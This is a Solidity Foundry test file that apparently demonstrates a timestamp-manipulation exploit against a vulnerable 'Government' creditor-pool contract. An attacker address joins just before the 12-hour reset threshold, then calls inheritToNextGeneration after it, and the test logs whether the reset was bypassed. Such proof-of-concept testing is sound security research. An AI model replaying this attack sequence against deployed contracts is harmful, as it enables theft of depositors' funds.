// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/list_dos.sol";

contract GovernmentTest is Test {
    Government gov;
    address constant user1 = address(0xA);
    address constant attacker = address(0xB);
    uint256 constant TWELVE_HOURS = 12 hours;

    function setUp() public {
        gov = new Government{value: 0}();
        deal(user1, 10 ether);
        deal(attacker, 10 ether);
    }

    function testTimestampManipulationVulnerability() public {
        // Initial investment by legitimate user
        vm.startPrank(user1);
        gov.lendGovernmentMoney{value: 1 ether}(address(0));
        vm.stopPrank();

        // Advance time to JUST BEFORE reset threshold (11:59:59)
        vm.warp(block.timestamp + TWELVE_HOURS - 1);
        
        // Capture state BEFORE first attack
        console2.log("--- BEFORE first attack (Add creditor near threshold) ---");
        uint256 creditorsBefore = gov.getCreditorAddresses().length;
        uint256 roundBeforeFirst = gov.round();
        uint256 lastCreditorBeforeFirst = gov.lastCreditorPayedOut();
        console2.log("Creditors length:", creditorsBefore);
        console2.log("Round count:", roundBeforeFirst);
        console2.log("Last creditor idx:", lastCreditorBeforeFirst);

        // First attacker action (adding near threshold)
        console2.log("--- TRIGGER: Attacker adds near threshold ---");
        vm.prank(attacker);
        gov.lendGovernmentMoney{value: 1 ether}(address(0));

        // Verify attacker added without system reset
        console2.log("--- AFTER first attack ---");
        uint256 creditorsAfterFirst = gov.getCreditorAddresses().length;
        uint256 roundAfterFirst = gov.round();
        uint256 lastCreditorAfterFirst = gov.lastCreditorPayedOut();
        console2.log("Creditors length:", creditorsAfterFirst);
        console2.log("Round count:", roundAfterFirst);
        console2.log("Last creditor idx:", lastCreditorAfterFirst);
        
        // Confirm expected state after legitimate creditor addition
        assertEq(creditorsAfterFirst, creditorsBefore + 1, "Creditors should increase");
        assertEq(roundAfterFirst, roundBeforeFirst, "Round should remain unchanged");

        // Advance to reset threshold EXCEEDED
        vm.warp(block.timestamp + 2);

        // Capture reset state BEFORE second attack
        console2.log("\n--- BEFORE second attack (Exceeded threshold) ---");
        uint256 creditorsBeforeSecond = gov.getCreditorAddresses().length;
        uint256 roundBeforeSecond = gov.round();
        uint256 lastCreditorBeforeSecond = gov.lastCreditorPayedOut();
        console2.log("Creditors length:", creditorsBeforeSecond);
        console2.log("Round count:", roundBeforeSecond);
        console2.log("Last creditor idx:", lastCreditorBeforeSecond);
        
        // Second attacker action (bypassing reset)
        console2.log("--- TRIGGER: inheritToNextGeneration called ---");
        vm.startPrank(attacker);
        gov.inheritToNextGeneration(attacker); // State-changing operation
        vm.stopPrank();

        // Capture reset state AFTER second attack
        console2.log("--- AFTER second attack ---");
        uint256 creditorsAfterSecond = gov.getCreditorAddresses().length;
        uint256 roundAfterSecond = gov.round();
        uint256 lastCreditorAfterSecond = gov.lastCreditorPayedOut();
        console2.log("Creditors length:", creditorsAfterSecond);
        console2.log("Round count:", roundAfterSecond);
        console2.log("Last creditor idx:", lastCreditorAfterSecond);

        // Differential verification: compare before/after reset state
        bool stateChanged = (
            creditorsAfterSecond != creditorsBeforeSecond ||
            roundAfterSecond != roundBeforeSecond ||
            lastCreditorAfterSecond != lastCreditorBeforeSecond
        );
        
        console2.log("\n--- Differential Verdict ---");
        if (!stateChanged) {
            console2.log("CRITICAL STATE UNCHANGED: Reset bypassed");
            console2.log("Vulnerability Exists: Attack prevented system reset");
        } else {
            console2.log("STATE CHANGED: Normal reset occurred");
            console2.log("Vulnerability not Exist: System reset triggered normally");
        }

        // Confirm the attacker remains in the creditors list
        address[] memory creditors = gov.getCreditorAddresses();
        assertGt(creditors.length, 0);
        assertEq(creditors[creditors.length - 1], attacker);
    }
}